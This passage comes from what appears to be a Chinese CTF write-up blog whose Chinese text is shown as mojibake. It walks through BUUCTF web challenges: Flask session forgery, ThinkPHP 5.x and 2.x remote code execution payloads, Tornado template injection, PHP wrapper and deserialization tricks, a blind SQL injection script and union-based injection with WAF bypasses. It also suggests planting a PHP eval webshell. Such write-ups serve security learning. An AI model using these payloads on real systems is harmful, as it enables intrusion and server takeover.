b&#39;1b917c9c3d1e4ed8bd25e61e7244e9768b2748b5e473d8da4543a3af3ab19736dcc10cb00cce46dbb944f3120f7faf739997fbd7e1a9168cd0aba8ff4a1083a5&#39;, &#39;csrf_token&#39;: b&#39;c8230e23f995910f94fca46c22c2b6af10562efc&#39;, &#39;image&#39;: b&#39;6Yku&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;}</code></pre><p>5.åˆ©ç”¨SECRET_KEYï¼šckj123ç”Ÿæˆsessionï¼Œå¹¶ä¼ å…¥åˆ°å®¢æˆ·ç«¯å»è®¿é—®ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B404%E6%9C%8822%E6%97%A51904_3.png" alt></p><pre><code>.eJw9kMGKwkAMhl9lydlDnV0vghdpd2ghGSpTy8xFtK22aceFqtQd8d13cMFDICHJ9__JA3bHsbm0sLyOt2YGu66G5QM-DrAELNMF6ppVid7G3wPJba9k1iNvB-JQ-zQiWSzImy_D6SfFbUdlEZGnMLdpKS4iFIk3pQmR3pWuPLkNG59MRqQTSmKrc2Fl1imdR5bxjrx2JGxrufJK94uQdzauByyT4CXoiHwyZdYqaR3J5I7xyRtdrOA5g-oyHnfXn745v08w_vSLfj0gkwu4udLJZLmPwnKwFwQ5Y3SpCBYDqhDots5Mqxeuc_tT8ybRMIx1_t85711owL523RlmcLs04-tvMI_g-QeRUW4a.YIFYNg.6MtE1lVA6UDS3WQgL-7tDF6oph0</code></pre><p>è§£å¾—ï¼š<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B404%E6%9C%8822%E6%97%A51907_4.png" alt></p><h2 id="ThinkPHP-5-Rce-1"><a href="#ThinkPHP-5-Rce-1" class="headerlink" title="[ThinkPHP]5-Rce"></a>[ThinkPHP]5-Rce</h2><p><strong>Thinkphp5 5.0.22/5.1.29è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</strong></p><p>thinkphpä¸ºphpçš„ä¸€ä¸ªå¼€å‘æ¡†æ¶</p><p>flagåœ¨phpinfoä¸­ï¼Œpayloadï¼š</p><pre><code>/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</code></pre><p>åŒæ—¶ä¹Ÿå¯ä»¥è¿™æ ·ï¼š</p><p>å°†phpinfoæ¢ä¸ºsystem</p><p>-1æ”¹ä¸ºï¼š</p><p>1.touch shell.php</p><p>2.echo â€œ<?php @eval(\$_POST['cmd']);?>â€œ &gt;&gt; fuck.phpæ¥å®ç°æ–‡ä»¶ä¸Šä¼ </p><h2 id="ThinkPHP-5-0-23-Rce"><a href="#ThinkPHP-5-0-23-Rce" class="headerlink" title="[ThinkPHP]5.0.23-Rce"></a>[ThinkPHP]5.0.23-Rce</h2><p><strong>æ¼æ´èŒƒå›´: &lt;= 5.0.23ã€&lt;= 5.1.32</strong></p><p>æ¼æ´åˆ©ç”¨ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B404%E6%9C%8822%E6%97%A52147_5.png" alt></p><pre><code>ä¿®æ”¹GET ä¸ºPOSTï¼›æ·»åŠ Content-Type: application/x-www-form-urlencoded_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B404%E6%9C%8822%E6%97%A52153_6.png" alt></p><pre><code>_method=__construct&amp;filter[]=phpinfo&amp;method=get&amp;server[REQUEST_METHOD]=-1</code></pre><h1 id="2021-4-23"><a href="#2021-4-23" class="headerlink" title="2021-4-23"></a>2021-4-23</h1><h2 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h2><p>å¾—åˆ°çš„ä¸‰ä¸ªé¡µé¢ï¼š</p><p>/flag.txt<br>flag in /fllllllllllllag</p><p>/welcome.txt<br>render</p><p>/hints.txt<br>md5(cookie_secret+md5(filename))</p><p>å³é”®æŸ¥çœ‹æºä»£ç ï¼š</p><pre><code>&lt;a href=&#39;/file?filename=/flag.txt&amp;filehash=ba37a4275f6ddf86b04f206ba3d7a173&#39;&gt;/flag.txt&lt;/a&gt;&lt;br/&gt;&lt;a href=&#39;/file?filename=/welcome.txt&amp;filehash=b19fea9259deebcc9c37cbf3e229688b&#39;&gt;/welcome.txt&lt;/a&gt;&lt;br/&gt;&lt;a href=&#39;/file?filename=/hints.txt&amp;filehash=fa122b5860e6f12aa608974974e03f80&#39;&gt;/hints.txt&lt;/a&gt;</code></pre><p>çœ‹å¤§æ‰‹å­ä»¬è¯´renderæ˜¯pythonçš„ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ï¼Œä»–ä»¬çš„urléƒ½æ˜¯ç”±filenameå’Œfilehashç»„æˆï¼Œfilehashå³ä¸ºä»–ä»¬filenameçš„md5å€¼ã€‚</p><p>ä¹Ÿå°±çœ‹å‡ºæ¥äº†ï¼Œæºä»£ç é‡Œé¢å°±æ˜¯renderçš„ä¸€ä¸ªä½“ç°ï¼Œæ ¹æ®æç¤º2çŸ¥é“filename=/fllllllllllllag.txtåŒæ—¶ä¹Ÿå°±ä¼šçŸ¥é“md5å€¼</p><p>çŸ¥è¯†ç‚¹ï¼š</p><p>å…³äºæ‰¾cookie_secretï¼Œå­˜åœ¨msgå‚æ•°ï¼Œå¯ä»¥è¿›è¡Œæ¨¡æ¿æ³¨å…¥ï¼š</p><pre><code>{{}}ã€‚å°è¯•äº†error?msg={{1}}ï¼Œå¯ä»¥æ„é€ ä¸€ä¸‹payloadï¼š?msg{{handler.settings}}ï¼Œæ¥å¾—åˆ°cookie_secret</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B404%E6%9C%8823%E6%97%A51456_1.png" alt></p><p>ç„¶åé€šè¿‡è„šæœ¬æ¥å®ç°md5(cookie_secret+md5(filename))</p><pre><code>import hashlibdef md5(s):    md5 = hashlib.md5()    md5.update(s.encode(&quot;utf-8&quot;))#æ³¨æ„encode    return md5.hexdigest()def filehash():    filename = &quot;/fllllllllllllag&quot;    cookie_secret = &quot;372e1e52-7d6f-4c5e-9d9e-9df4d88947b9&quot;    print(md5(cookie_secret + md5(filename)))filehash()</code></pre><p>å¾—åˆ°ä¼´éšç€cookie_secretå°†/fllllllllllllagï¼Œmd5å¤„ç†åçš„md5å€¼ï¼š312923d3a93b268a692e63de56587cd9</p><p>ç„¶åå–ä»£å¹¶è®¿é—®ï¼š</p><pre><code>http://5b834ffd-6390-4d10-a586-d13b008b2da7.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=312923d3a93b268a692e63de56587cd9</code></pre><p>å¾—åˆ°flag</p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>è€ƒç‚¹ï¼š</p><p>1.phpä¼ªåè®®çš„åˆ©ç”¨</p><p>2.phpååºåˆ—åŒ–æ“ä½œ</p><p>çŸ¥è¯†ç‚¹ï¼š</p><p><a href="https://www.jianshu.com/p/0a8339fcc269" target="_blank" rel="noopener">PHPä¼ªåè®®åœ¨CTFä¸­çš„åº”ç”¨</a></p><p>1.å…³äºdata://çš„ä¼ªåè®®åˆ©ç”¨</p><p>è‡ªPHP&gt;=5.2.0èµ·ï¼Œå¯ä»¥ä½¿ç”¨data://æ•°æ®æµå°è£…å™¨ï¼Œä»¥ä¼ é€’ç›¸åº”æ ¼å¼çš„æ•°æ®ã€‚é€šå¸¸å¯ä»¥ç”¨æ¥æ‰§è¡ŒPHPä»£ç ã€‚ä¸€èˆ¬éœ€è¦ç”¨åˆ°base64ç¼–ç ä¼ è¾“<br>æ¯”å¦‚ï¼š<br>é€šè¿‡data://text/plainåè®®æ¥è¿›è¡Œæ¼æ´åˆ©ç”¨ã€‚<br>?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b<br>url=data://text/plain,<?php print_r(glob("*")); ?></p><p>2.php://filterçš„åˆ©ç”¨</p><p>?file=php://filter/read=convert.base64-encade/resource=useless.php</p><table><thead><tr><th>åç§°</th><th>æè¿°</th></tr></thead><tbody><tr><td>resource=&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt;</td><td>è¿™ä¸ªå‚æ•°æ˜¯å¿…é¡»çš„ã€‚å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚</td></tr><tr><td>read=&lt;è¯»é“¾çš„ç­›é€‰åˆ—è¡¨&gt;</td><td>è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚</td></tr><tr><td>write=&lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨&gt;</td><td>è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚</td></tr><tr><td>&lt;ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨&gt;</td><td>ä»»ä½•æ²¡æœ‰ä»¥ read= æˆ– write= ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚</td></tr></tbody></table><h3 id="è§£é¢˜æ­¥éª¤ï¼š"><a href="#è§£é¢˜æ­¥éª¤ï¼š" class="headerlink" title="è§£é¢˜æ­¥éª¤ï¼š"></a>è§£é¢˜æ­¥éª¤ï¼š</h3><h4 id="1-ä»£ç å®¡è®¡ï¼š"><a href="#1-ä»£ç å®¡è®¡ï¼š" class="headerlink" title="1.ä»£ç å®¡è®¡ï¼š"></a>1.ä»£ç å®¡è®¡ï¼š</h4><pre><code>&lt;?php  $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;)){    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;    if(preg_match(&quot;/flag/&quot;,$file)){        echo &quot;Not now!&quot;;        exit();     }else{        include($file);  //useless.php        $password = unserialize($password);        echo $password;    }}else{    highlight_file(__FILE__);}?&gt;</code></pre><h5 id="ç¬¬ä¸€æ­¥ï¼š"><a href="#ç¬¬ä¸€æ­¥ï¼š" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼š"></a>ç¬¬ä¸€æ­¥ï¼š</h5><p>è¦æ±‚ä¼ å…¥çš„textä¸­å«æœ‰welcome to the zjctfå­—æ®µï¼ŒåŒæ—¶ä¿è¯ä¸ºä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œæ‰€ä»¥è€ƒç‚¹å°±æ˜¯data://text/plainï¼›ç´§æ¥ç€æ„é€ å‚æ•°ï¼š</p><pre><code>/?text=data://text/plain,welcome to the zjctf</code></pre><p>æˆ–è€…ï¼š</p><pre><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code></pre><p>æ­¤ç§æƒ…å†µæ˜¯ä¸ºäº†é˜²æ­¢è¿‡æ»¤</p><h5 id="ç¬¬äºŒæ­¥ï¼š"><a href="#ç¬¬äºŒæ­¥ï¼š" class="headerlink" title="ç¬¬äºŒæ­¥ï¼š"></a>ç¬¬äºŒæ­¥ï¼š</h5><p>è¿‡æ»¤æ‰ä¼ å…¥fileå‚æ•°ä¸­çš„flagï¼ŒåŒæ—¶ç»™å‡ºæç¤º//useless.phpï¼Œå¾—çŸ¥è¿ç”¨includeçš„è¯å°±å¯ä»¥åˆ©ç”¨php://inputä¼ªåè®®æ¥å®ç°æ–‡ä»¶è¯»å–ï¼ˆè¿™é‡Œå¾ˆæ˜æ˜¾éœ€è¦è¯»å–æ–‡ä»¶ï¼‰ï¼Œæ„é€ å‚æ•°ï¼š</p><pre><code>&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></pre><p>äºŒè€…è”åˆå¾—ï¼š</p><pre><code>/?text=data://text/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></pre><h5 id="ç¬¬ä¸‰æ­¥ï¼š"><a href="#ç¬¬ä¸‰æ­¥ï¼š" class="headerlink" title="ç¬¬ä¸‰æ­¥ï¼š"></a>ç¬¬ä¸‰æ­¥ï¼š</h5><p>é’ˆå¯¹å¾—åˆ°çš„useless.phpçš„base64è¿›è¡Œè§£ç å¾—åˆ°ï¼š</p><pre><code>&lt;?php  class Flag{  //flag.php      public $file;      public function __tostring(){          if(isset($this-&gt;file)){              echo file_get_contents($this-&gt;file);             echo &quot;&lt;br&gt;&quot;;        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);        }      }  }  ?&gt;  </code></pre><p>ä»–æŒ‡å¼•æˆ‘ä»¬å»ç»™fileèµ‹å€¼ä¸ºflag.php</p><p>æœ¬åœ°è¿›è¡Œåºåˆ—åŒ–ï¼š</p><pre><code>&lt;?php  class Flag{  //flag.php      public $file = &quot;flag.php&quot;;      public function __tostring(){          if(isset($this-&gt;file)){              echo file_get_contents($this-&gt;file);             echo &quot;&lt;br&gt;&quot;;        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);        }      }  }  $a = new Flag();echo serialize($a);?&gt;  </code></pre><p>å¾—åˆ°ï¼šO:4:â€Flagâ€:1:{s:4:â€fileâ€;s:8:â€flag.phpâ€;}</p><h5 id="æœ€åä¸€æ­¥ï¼š"><a href="#æœ€åä¸€æ­¥ï¼š" class="headerlink" title="æœ€åä¸€æ­¥ï¼š"></a>æœ€åä¸€æ­¥ï¼š</h5><p>æ•´åˆpayload</p><pre><code>/?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></pre><p>å³é”®æºä»£ç å³å¯å¾—åˆ°flag</p><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h2><h3 id="è„šæœ¬ï¼š"><a href="#è„šæœ¬ï¼š" class="headerlink" title="è„šæœ¬ï¼š"></a>è„šæœ¬ï¼š</h3><pre><code>import requestsimport base64import sysimport stringimport hashlibimport ioimport timesys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding=&#39;utf-8&#39;)  # æ”¹å˜æ ‡å‡†è¾“å‡ºçš„é»˜è®¤ç¼–ç ,å¦åˆ™s.textä¸èƒ½è¾“å‡ºx = string.printableflag = &quot;&quot;url = &quot;http://56039d8e-d2a3-4fc1-8195-3e18f2c1ea8c.node3.buuoj.cn/index.php&quot;payload = {    &quot;id&quot;: &quot;&quot;}for i in range(0, 60):    for j in x:        payload[&quot;id&quot;] = &quot;1=(ascii(substr((select(flag)from(flag)),%s,1))=%s)=1&quot; % (str(i), ord(j))        s = requests.post(url, data=payload)        # print(s.text)        if &quot;Hello&quot; in s.text:            flag += j            print(flag)            breakprint(flag)</code></pre><h3 id="è„šæœ¬çš„è§£é‡Šï¼š"><a href="#è„šæœ¬çš„è§£é‡Šï¼š" class="headerlink" title="è„šæœ¬çš„è§£é‡Šï¼š"></a>è„šæœ¬çš„è§£é‡Šï¼š</h3><h4 id="payload-â€œidâ€-çš„æ¥æºï¼š"><a href="#payload-â€œidâ€-çš„æ¥æºï¼š" class="headerlink" title="payload[â€œidâ€]çš„æ¥æºï¼š"></a>payload[â€œidâ€]çš„æ¥æºï¼š</h4><p>postæäº¤éœ€è¦ä¼ å…¥çš„å‚æ•°ä¸ºid</p><h4 id="å…³äº1-1çš„ä¼˜å…ˆè¿ç®—ï¼š"><a href="#å…³äº1-1çš„ä¼˜å…ˆè¿ç®—ï¼š" class="headerlink" title="å…³äº1=()=1çš„ä¼˜å…ˆè¿ç®—ï¼š"></a>å…³äº1=()=1çš„ä¼˜å…ˆè¿ç®—ï¼š</h4><p>1=(if(1&gt;0))=1è¿™æ ·ä¼šæ­£å¸¸å›æ˜¾</p><p>1=(if(1&lt;0))=1è¿™æ ·ä¸ä¼šæ­£å¸¸å›æ˜¾</p><p>ä¸€ä¸ªè¿ç®—ç»“æœä¸ºtrueï¼Œä¸€ä¸ªä¸ºfalse</p><p>ç¬¬ä¸€ä¸ª1ä¸ifå‡½æ•°è¿”å›çš„å€¼è¿›è¡Œåˆ¤æ–­ï¼Œä¼šå¾—åˆ°1æˆ–è€…0ï¼Œä¸ºäº†ç¡®ä¿è¿”å›å€¼ä¸€å®šä¸ºtrueï¼Œæ‰€ä»¥å†ä¸åé¢çš„1ï¼ˆtrueï¼‰å†æ¥ä¸€æ¬¡ç¡®å®šæ€§è´¨çš„åˆ¤æ–­</p><p>ç¬¬äºŒæ¬¡çš„=æ˜¯ä¸ºäº†ä¿è¯ç¬¬ä¸€æ¬¡çš„äº‹ä»¶æˆç«‹åå†æ‰§è¡Œ</p><p>è·Ÿé«˜ä¸­æ•°å­¦çš„æ¦‚ç‡ä¸€æ ·</p><p>ä¿è¯aäº‹ä»¶å‘ç”Ÿçš„å‰æä¸‹å‘ç”Ÿbäº‹ä»¶</p><h4 id="if-â€œHelloâ€-in-s-text"><a href="#if-â€œHelloâ€-in-s-text" class="headerlink" title="if â€œHelloâ€ in s.text:"></a>if â€œHelloâ€ in s.text:</h4><p>å› ä¸ºè¿”å›æ­£ç¡®çš„æ—¶å€™æ‰ä¼šæ˜¾hello</p><h2 id="ThinkPHP-2-Rce"><a href="#ThinkPHP-2-Rce" class="headerlink" title="[ThinkPHP]2-Rce"></a>[ThinkPHP]2-Rce</h2><p>ThinkPHP 2.x çš„ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´</p><p>é¢˜ç›®ï¼š</p><pre class="line-numbers language-php"><code class="language-php">ç¤ºä¾‹æºç æ§åˆ¶å™¨IndexActionç±»<span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">IndexAction</span> <span class="token keyword">extends</span> <span class="token class-name">Action</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">,</span><span class="token string">'Hello,ThinkPHP'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payloadï¼š</p><pre><code>?s=/Index/index/L/${@phpinfo()}</code></pre><h1 id="2021-4-24"><a href="#2021-4-24" class="headerlink" title="2021-4-24"></a>2021-4-24</h1><h2 id="ç½‘é¼æ¯-2018-Fakebook"><a href="#ç½‘é¼æ¯-2018-Fakebook" class="headerlink" title="[ç½‘é¼æ¯ 2018]Fakebook"></a>[ç½‘é¼æ¯ 2018]Fakebook</h2><p>çŸ¥è¯†ç‚¹ï¼š</p><p>1.è”åˆæŸ¥è¯¢</p><p>2.phpååºåˆ—åŒ–</p><p>ç™»é™†åæœ‰ä¸‰æ ï¼Œusernameï¼Œageï¼Œblogï¼ŒæŸ¥çœ‹æºä»£ç ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B404%E6%9C%8824%E6%97%A50928_1.png" alt></p><p>å‘ç°è¿™é‡Œç”¨data://ä¼ªåè®®ä¼šè¾“å‡ºä¸€äº›ä¸œè¥¿ï¼Œå¯ä»¥æ˜¯flag</p><p>åˆå› ä¸ºæ­¤é¡µé¢å­˜åœ¨sqlæ³¨å…¥ç‚¹ï¼Œsqlmapè·‘ä¸åŠ¨ï¼Œä¹Ÿå¯èƒ½æ˜¯æˆ‘ä¸ä¼šä½¿ã€‚ã€‚ã€‚</p><p>å¯ä»¥ç”¨sqlfuzzå°å­—å…¸è·‘ä¸€ä¸‹ï¼Œä½†æ˜¯æˆ‘æœ‰wpæˆ‘å°±ä¸è·‘äº†ã€‚ã€‚ã€‚</p><p>payloadå¦‚ä¸‹ï¼š</p><p>ç»•è¿‡wafçš„å§¿åŠ¿ï¼š</p><pre><code>union all selectunion/**/select/*!union*/ select</code></pre><pre><code>?no=1 and 1=1#æ•´æ•°å‹å•Šï¼Œå¾ˆå¥½?no=1 order by 4#æœ‰4åˆ—?no=1 order by 5#æŠ¥é”™?no=-1 union/**/select 1,2,3,4#?no=-1 union/**/select 1,database(),3,4#åº“åï¼šfakebook?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#39;fakebook&#39;#è¡¨æ˜ï¼šusers?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;#åˆ—åï¼šno,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS?no=-1 union/**/select 1,group_concat(no,&#39;**&#39;,username,&#39;**&#39;,passwd,&#39;**&#39;,data),3,4 from fakebook.users#</code></pre><p>æœ€ç»ˆå¾—åˆ°ï¼š</p><p>noï¼š1</p><p>usernameï¼štest</p><p>passwdï¼šcf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e</p><p>dataï¼šO:8:â€UserInfoâ€:3:{s:4:â€nameâ€;s:4:â€testâ€;s:3:â€ageâ€;i:123;s:4:â€blogâ€;s:7:â€123.comâ€;}</p><p>å¹¶æ˜¾ç¤ºæŠ¥é”™ï¼š</p><p><strong>Notice</strong>: unserialize(): Error at offset 0 of 1 bytes in <strong>/var/www/html/view.php</strong> on line <strong>31</strong></p><p>ä¹Ÿå°±æ˜¯è¯´dataå¯ä»¥ä¼ å…¥ååºåˆ—åŒ–ï¼Œæœ‰åºåˆ—åŒ–å°±ä¼šæœ‰æºç ï¼Œå¤‡ä»½å­—å…¸è·‘ä¸€ä¸‹ï¼Œå¾—åˆ°robots.txtï¼š</p><p>User-agent: *<br>Disallow: /user.php.bak</p><p>user.phpå†…å®¹ï¼š<a href="https://blog.csdn.net/qq_43622442/article/details/105633194" target="_blank" rel="noopener">è¿™ç¯‡æ–‡ç« å¯¹è¯¥åºåˆ—åŒ–è¿›è¡Œäº†å¾ˆå¥½çš„è§£é‡Š</a></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">UserInfo</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token variable">$age</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span> <span class="token operator">=</span> <span class="token variable">$blog</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token shell-comment comment"># curl_init ï¼š åˆå§‹åŒ–ä¸€ä¸ªcURLä¼šè¯ï¼Œä¾›curl_setopt(), curl_exec()å’Œcurl_close() å‡½æ•°ä½¿ç”¨ã€‚</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token shell-comment comment"># curl_setopt ï¼š è¯·æ±‚ä¸€ä¸ªurlã€‚å…¶ä¸­CURLOPT_URLè¡¨ç¤ºéœ€è¦è·å–çš„URLåœ°å€ï¼Œåé¢å°±æ˜¯è·Ÿä¸Šäº†å®ƒçš„å€¼ã€‚</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token shell-comment comment"># CURLOPT_RETURNTRANSFER å°†curl_exec()è·å–çš„ä¿¡æ¯ä»¥æ–‡ä»¶æµçš„å½¢å¼è¿”å›ï¼Œè€Œä¸æ˜¯ç›´æ¥è¾“å‡ºã€‚</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token shell-comment comment"># curl_execï¼ŒæˆåŠŸæ—¶è¿”å› TRUEï¼Œ æˆ–è€…åœ¨å¤±è´¥æ—¶è¿”å› FALSEã€‚ ç„¶è€Œï¼Œå¦‚æœ CURLOPT_RETURNTRANSFERé€‰é¡¹è¢«è®¾ç½®ï¼Œå‡½æ•°æ‰§è¡ŒæˆåŠŸæ—¶ä¼šè¿”å›æ‰§è¡Œçš„ç»“æœï¼Œå¤±è´¥æ—¶è¿”å› FALSE ã€‚</span>        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token shell-comment comment"># CURLINFO_HTTP_CODE ï¼šæœ€åä¸€ä¸ªæ”¶åˆ°çš„HTTPä»£ç ã€‚curl_getinfoï¼šä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å›å®ƒçš„å€¼ï¼Œå› ä¸ºè®¾ç½®äº†CURLINFO_HTTP_CODEï¼Œæ‰€ä»¥æ˜¯è¿”å›çš„çŠ¶æ€ç ã€‚</span>        <span class="token variable">$httpCode</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLINFO_HTTP_CODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token shell-comment comment">#å¦‚æœçŠ¶æ€ç ä¸æ˜¯404ï¼Œå°±è¿”å›execçš„ç»“æœã€‚</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$httpCode</span> <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token number">404</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getBlogContents</span> 